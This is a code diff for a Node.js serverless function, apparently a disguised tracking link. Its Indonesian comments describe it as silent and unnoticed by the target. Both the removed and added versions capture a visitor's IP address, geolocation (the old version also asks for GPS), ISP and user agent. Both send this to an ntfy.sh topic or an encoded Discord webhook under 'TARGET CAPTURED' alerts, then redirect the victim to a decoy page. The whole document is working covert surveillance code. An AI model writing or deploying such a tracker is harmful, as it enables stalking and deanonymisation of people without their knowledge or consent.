@@ -1,94 +1,72 @@
-module.exports = (req, res) => {
-    // We send back an HTML page that runs the tracker logic locally on the victim's browser
-    const htmlCode = `<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sedang Memuat...</title>
-</head>
-<body style="background:#fff;">
-    <script>
-        // High-accuracy live position tracker using HTML5 Geolocation API
-        async function captureAndSend() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const topic = urlParams.get('topic');
-            const target = urlParams.get('t');
-            const webhookUrl = urlParams.get('w'); // for discord backward compat
+const axios = require('axios');
 
-            let redirectUrl = 'https://google.com';
+module.exports = async (req, res) => {
+    const { topic, t, w } = req.query;
+
+    // Decode Target Redirect URL
+    let targetUrl = 'https://google.com';
+    if (t) {
+        try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
+    }
+
+    if (!topic && !w) {
+        return res.redirect(301, targetUrl);
+    }
+
+    // 1. SILENT SERVER-SIDE IP CAPTURE (Gak bisa di-block AdBlock/Brave + Gak butuh izin)
+    const ipRaw = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || '';
+    const cleanIp = ipRaw.split(',')[0].trim();
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+
+    let geo = {};
+    if (cleanIp) {
+        try {
+            // Gunakan HTTPS Server-Side GeoIP Lookup
+            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
+            geo = geoReq.data;
+        } catch (e) {
+            // fallback api
             try {
-                if (target) redirectUrl = atob(target);
-            } catch(e) {}
-
-            // Gather standard data first
-            let geoData = {};
-            try {
-                const res = await fetch('https://ip-api.com/json/');
-                geoData = await res.json();
-            } catch(e) {}
-
-            let payload = {
-                ip: geoData.query || 'Unknown',
-                country: geoData.country || 'Unknown',
-                region: geoData.regionName || 'Unknown',
-                city: geoData.city || 'Unknown',
-                isp: geoData.isp || geoData.org || 'Unknown',
-                lat: geoData.lat,
-                lon: geoData.lon,
-                ua: navigator.userAgent,
-                time: new Date().toISOString()
-            };
-
-            // Force Redirect Helper
-            const sendAndGo = async () => {
-                try {
-                    if(topic) {
-                        await fetch('https://ntfy.sh/' + topic, {
-                            method: 'POST',
-                            body: JSON.stringify(payload),
-                            headers: { 'Title': 'Target Tertangkap!', 'Tags': 'skull' }
-                        });
-                    }
-                    if(webhookUrl) {
-                        await fetch(atob(webhookUrl), {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                content: \`🚨 TARGET CAPTURED: IP \${payload.ip} | GEO: \${payload.city} | Accurate GPS: \${payload.accurate ? 'YES' : 'NO'} \\n🔗 Maps: https://www.google.com/maps?q=\${payload.lat},\${payload.lon}\`
-                            })
-                        });
-                    }
-                } catch(e) {}
-                
-                // Final Redirect to victim's desired content
-                window.location.replace(redirectUrl);
-            };
-
-            // Ask for real GPS permission, if denied (or timeout in 4s), fallback to IP-based location
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        payload.lat = position.coords.latitude;
-                        payload.lon = position.coords.longitude;
-                        payload.accurate = true;
-                        sendAndGo();
-                    },
-                    (error) => {
-                        sendAndGo(); // User denied or timeout, send IP data
-                    },
-                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
-                );
-            } else {
-                sendAndGo(); // Browser doesnt support
-            }
+                const geoFallback = await axios.get(`https://ipwhois.app/json/${cleanIp}`);
+                const g = geoFallback.data;
+                geo = {
+                    query: g.ip, country: g.country, regionName: g.region, city: g.city,
+                    isp: g.isp, lat: g.latitude, lon: g.longitude
+                };
+            } catch (err) { }
         }
-        captureAndSend();
-    </script>
-</body>
-</html>`;
+    }
 
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.status(200).send(htmlCode);
+    const payload = {
+        ip: geo.query || cleanIp || 'Unknown',
+        country: geo.country || 'Unknown',
+        region: geo.regionName || 'Unknown',
+        city: geo.city || 'Unknown',
+        isp: geo.isp || geo.org || 'Unknown',
+        lat: geo.lat || null,
+        lon: geo.lon || null,
+        ua: userAgent,
+        time: new Date().toISOString()
+    };
+
+    // 2. SERVER-TO-SERVER PUSH (Siluman, ga keliatan di Network Tab target)
+    try {
+        if (topic) {
+            await axios.post(`https://ntfy.sh/${topic}`, JSON.stringify(payload), {
+                headers: { 'Title': 'Target Tertangkap!', 'Tags': 'skull' }
+            });
+        }
+
+        if (w) {
+            const webhookUrl = Buffer.from(w, 'base64').toString('utf-8');
+            await axios.post(webhookUrl, {
+                content: `🚨 **TARGET CAPTURED** 🚨\n**IP**: ${payload.ip}\n**GEO**: ${payload.city}, ${payload.region}\n**ISP**: ${payload.isp}\n**Maps**: https://www.google.com/maps?q=${payload.lat},${payload.lon}\n\`\`\`${payload.ua}\`\`\``
+            });
+        }
+    } catch (err) {
+        // silent fail
+    }
+
+    // 3. AUTO REDIRECT INSTANT (User gak nyadar)
+    return res.redirect(301, targetUrl);
 };
